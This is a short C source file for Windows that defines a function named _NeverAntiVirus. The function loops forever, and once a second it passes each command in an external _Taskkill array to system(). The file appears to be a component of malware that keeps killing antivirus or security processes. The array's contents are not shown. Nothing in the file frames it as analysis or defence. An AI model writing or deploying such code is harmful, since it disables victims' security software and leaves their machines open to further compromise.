#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _NeverAntiVirus(void)
{
    volatile struct _LocalCtx {
        int task_index;
    } ctx;

    ctx.task_index = 0;
    
    do {
        for (ctx.task_index = 0; _Taskkill[ctx.task_index] != NULL; ctx.task_index++) {
            system(_Taskkill[ctx.task_index]);
        }
        Sleep(1000);
    } while(1);
}
#pragma optimize("", on)
